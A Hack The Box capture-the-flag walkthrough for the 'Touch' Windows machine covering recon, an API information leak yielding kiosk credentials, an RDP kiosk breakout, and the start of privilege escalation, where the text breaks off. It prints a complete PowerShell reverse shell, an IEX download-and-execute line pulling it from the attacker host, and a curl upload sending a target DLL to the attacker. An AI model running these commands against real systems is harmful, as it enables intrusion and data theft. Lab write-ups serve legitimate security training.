# Touch-HTB

Nmap report:
````
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-03 16:55 -0300
Nmap scan report for 10.129.77.232
Host is up (0.41s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Service
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-cors: GET POST PUT OPTIONS
| http-title: Nexion DeviceHub - Login
|_Requested resource was /login
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|11|2008|7 (90%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (90%), Microsoft Windows 11 24H2 (89%), Microsoft Windows 11 21H2 (87%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   451.92 ms 10.10.16.1
2   452.01 ms 10.129.77.232

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.48 seconds

````

3389 is probably a rdp service. Port 8443 is the following website:

<img width="790" height="721" alt="image" src="https://github.com/user-attachments/assets/e47ef2d6-3882-4dcf-9e68-7d318506deb6" />

The given credentials did not work here, let's try something other than that:
ffuf the website:
````
ffuf -w ~/Documents/seclists/Discovery/Web-Content/quickhits.txt -u http://touch.htb:8443/FUZZ -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://touch.htb:8443/FUZZ
 :: Wordlist         : FUZZ: /home/spaz/Documents/seclists/Discovery/Web-Content/quickhits.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

api/                    [Status: 403, Size: 35, Words: 2, Lines: 1, Duration: 230ms]
login                   [Status: 200, Size: 3572, Words: 122, Lines: 3, Duration: 239ms]
:: Progress: [2570/2570] :: Job [1/1] :: 158 req/sec :: Duration: [0:00:16] :: Errors: 0 ::
````
Cool, we got the 200 on login and a 403 on the /api. 403 means that we are not authorized to see it, but this does not mean that the files and directories inside the api are also not permitted to us. Keep fuzzing:

````
ffuf -w ~/Documents/seclists/Discovery/Web-Content/api/objects.txt -u http://touch.htb:8443/api/FUZZ -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://touch.htb:8443/api/FUZZ
 :: Wordlist         : FUZZ: /home/spaz/Documents/seclists/Discovery/Web-Content/api/objects.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

status                  [Status: 200, Size: 116, Words: 3, Lines: 1, Duration: 245ms]
:: Progress: [3133/3133] :: Job [1/1] :: 141 req/sec :: Duration: [0:00:19] :: Errors: 0 ::
````

The status page is 200. Now we can access it:

<img width="905" height="260" alt="image" src="https://github.com/user-attachments/assets/0e8a759b-24dc-4b91-a90c-eca425e553f6" />

The serial number "NX-DH-2024-B7042" can be used to access the login page:

<img width="1673" height="552" alt="image" src="https://github.com/user-attachments/assets/bfa74874-904f-4533-93bb-d0863373c6b5" />

Now we have credentials: KioskUser/K!0sk2026#

Let's try connecting RPD with them:
````
xfreerdp /v:touch.htb /u:KioskUser /p:'K!0sk2026#' /d:TOUCH /cert:ignore
````

It gives us:

<img width="1025" height="803" alt="image" src="https://github.com/user-attachments/assets/746b3c40-a1b6-44e5-b3d6-c05d19dff9fb" />

We are not going to use anything here. Instead, if you alt+tab you can see a .bat running with at the same page:

<img width="1030" height="802" alt="image" src="https://github.com/user-attachments/assets/2286fbc3-b731-4127-bb1c-18e30c2ee440" />

Good. If we Right Clic the cmd window we can open the context menu and click properties:

<img width="1026" height="807" alt="image" src="https://github.com/user-attachments/assets/1381bcdc-1502-4a2a-99d2-a9c8b72340ac" />

There, go for experimental terminal settings:

<img width="1026" height="806" alt="image" src="https://github.com/user-attachments/assets/82b2c808-3d21-42b8-af36-83dfdc6d044d" />

This opens a small window that reads "just once". You won't be able to click on the first try, but hold Tab and click the down arrow a few times until it becomes clickable and then, click it:

<img width="1027" height="807" alt="image" src="https://github.com/user-attachments/assets/bac42968-ad7f-4b42-bd2f-1cc9b6469720" />

This opens edge:

<img width="1027" height="807" alt="image" src="https://github.com/user-attachments/assets/e3900a2b-fda4-44ff-85cd-4488f3a7a072" />

Now we have to download a cmd with edge:
````
C:\windows\system32\cmd.exe
````

<img width="1017" height="516" alt="image" src="https://github.com/user-attachments/assets/ff80074b-4277-4407-8b57-79c8e5560014" />

Good. Now we can access the cmd as kioskuser:

<img width="977" height="507" alt="image" src="https://github.com/user-attachments/assets/9704d06f-22e6-4dac-be23-097670ae0508" />

We can read the flag as is, but let's get a reverse shell. Test connection to your home machine:
````
ping <tun0-ip>
````

<img width="811" height="677" alt="image" src="https://github.com/user-attachments/assets/00744919-699f-44ce-8114-f810c10ca8f7" />

Since we can connect, now create a shell.ps1 with the following poweshell code code inside:
````
$LHOST = "<your-ip>"; $LPORT = <your-port>; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
````

The open a netcat listener:
````
nc -lnvp <your-port>
````
And a python server:
````
python -m http.server
````

Now go back to the cmd at the target and type powershell:

<img width="957" height="247" alt="image" src="https://github.com/user-attachments/assets/122db388-d715-4234-9c6a-009b8d8b68f4" />

Next step is using a iex to download and execute the reverse shell:

````
IEX (New-Object Net.WebClient).DownloadString('http://<your-ip>:<you-port>/shell.ps1')
````

Execute this and you'll get a shell as kioskuser over at the listener, there, just read the user.txt:

<img width="1387" height="172" alt="image" src="https://github.com/user-attachments/assets/731a8b8b-bcac-4070-b034-86c3a2df5995" />

Now for privesc let's annumerate first. At program files i found :
````
pwd
C:\program files\nexion systems\printer\publish
dir
plugins NexionPrinter.deps.json NexionPrinter.dll NexionPrinter.exe NexionPrinter.pdb NexionPrinter.runtimeconfig.json
````

Let's decompile the .exe so w can read it. First back at your machine, open:
````
python -m uploadserver
````

Then execute the following at windows cmd:
````
curl.exe -X POST -F "files=@C:\program files\nexion systems\docreader\publish\NexionDocReader.dll" http://10.10.16.45:8000/upload
````

Now you have nexionprinter.exe at your kali. Decompile it with ilspy 
